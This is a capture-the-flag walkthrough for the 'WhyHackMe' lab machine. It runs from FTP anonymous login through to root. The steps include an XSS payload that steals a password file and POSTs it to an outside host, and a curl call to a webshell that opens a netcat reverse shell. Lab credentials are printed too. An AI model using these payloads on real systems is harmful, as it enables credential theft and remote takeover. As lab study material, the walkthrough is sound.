# ⁇ WhyHackMe??

## Vulnerability Analysis

### Identified Vulnerabilities
1. **FTP Anonymous Login** - Anonymous access allowed on port 21
2. **Admin Bot XSS** - Admin bot executes scripts in comment system
3. **Apache Access Control Issues** - Configuration files and certificates exposed
4. **Information Disclosure** - Hints provided through txt files

## Exploitation Process

### 1. Reconnaissance
```bash
nmap -sV -sC target_ip
```
**Results**: Ports 21(FTP), 22(SSH), 80(HTTP) open

### 2. FTP Anonymous Access
```bash
ftp target_ip
# Username: anonymous
# Password: (empty)
get update.txt
```
**Information Gathered**: 
- `/dir` directory blocked
- Account information exists at `127.0.0.1/dir/pass.txt`
- Access possible with `common` account

### 3. Directory Bruteforcing
```bash
gobuster dir -u http://target_ip -w rockyou.txt
```
**Discovery**: `register.php` page found

### 4. XSS Attack
- Create account and login
- Confirmed admin bot checks comments
- Inject XSS payload in Username field

```javascript
<script>
fetch("http://127.0.0.1/dir/pass.txt")
.then(x => x.text())
.then(y => fetch("http://10.8.5.146:8000", {method: "POST", body:y}))
</script>
```

**Obtained Credentials**: 
- Username: `jack`
- Password: `WhyIsMyPasswordSoStrongIDK`

### 5. SSH Access & User Flag
```bash
ssh jack@target_ip
cat user.txt
```

### 6. Privilege Escalation Preparation
Important files found in `/opt` directory:
```bash
sftp jack@target_ip
get /opt/capture.pcap
get /opt/urgent.txt
```

### 7. Network Analysis
- `iptables --list`: Port 41312 blocked by DROP rule
- `iptables --flush`: Flush firewall rules (still inaccessible)

### 8. Apache Configuration Analysis
```bash
cat /etc/apache2/sites-enabled/*
```
**Findings**:
- SSL enabled (TLS 1.2)
- Certificate path: `/etc/apache2/certs/apache.key`
- CGI directory: `/usr/lib/cgi-bin/`

### 9. Wireshark Packet Analysis
1. SSL key configuration: Load `apache.key` file
2. Filter: `tcp.port == 41312 && http`
3. **Webshell discovered**: `https://target_ip:41312/cgi-bin/5UP3r53Cr37.py`

**Parameters**:
- `key=48pfPHUrj4pmHzrC`
- `iv=VZukhsCo8TlTXORN`
- `cmd=<command>`

### 10. Reverse Shell
```bash
# Start listener locally
ncat -lnvp 4444

# Execute reverse shell
curl -k "https://target_ip:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=busybox%20nc%2010.8.5.146%204444%20-e%20/bin/bash"
```

### 11. Root Privilege Escalation
```bash
sudo -l
sudo su root
cat root.txt
```

## Key Points

1. **FTP Anonymous Access** - Importance of initial information gathering
2. **Information Exfiltration via XSS** - Leveraging admin bot functionality
3. **Network Packet Analysis** - Wireshark + SSL decryption
4. **Webshell Discovery & Exploitation** - Analyzing encrypted communications
5. **Privilege Escalation** - Sudo permission verification

## Learning Elements
- **Wireshark SSL/TLS Decryption**
- **SSRF Attack via XSS**
- **Apache Configuration Analysis**
- **Linux Firewall (iptables) Bypass**
- **Webshell Parameter Analysis**
